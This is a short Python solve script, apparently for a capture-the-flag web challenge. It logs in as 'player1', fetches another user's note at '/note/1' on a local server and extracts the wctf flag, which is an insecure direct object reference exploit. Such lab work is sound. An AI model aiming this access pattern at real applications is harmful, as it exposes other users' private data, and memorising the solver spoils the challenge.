import os
import re
from http.cookiejar import CookieJar
from urllib.parse import urlencode
from urllib.request import HTTPCookieProcessor, Request, build_opener


def solve(base):
    base = base.rstrip("/")
    client = build_opener(HTTPCookieProcessor(CookieJar()))
    login = Request(base + "/", urlencode({"username": "player1"}).encode())
    with client.open(login, timeout=5):
        pass
    with client.open(base + "/note/1", timeout=5) as response:
        match = re.search(r"wctf\{[^}]+\}", response.read().decode())
    if match is None:
        raise RuntimeError("flag note was not readable")
    return match.group()


if __name__ == "__main__":
    print(solve(os.environ.get("BASE_URL", "http://127.0.0.1:8080")))
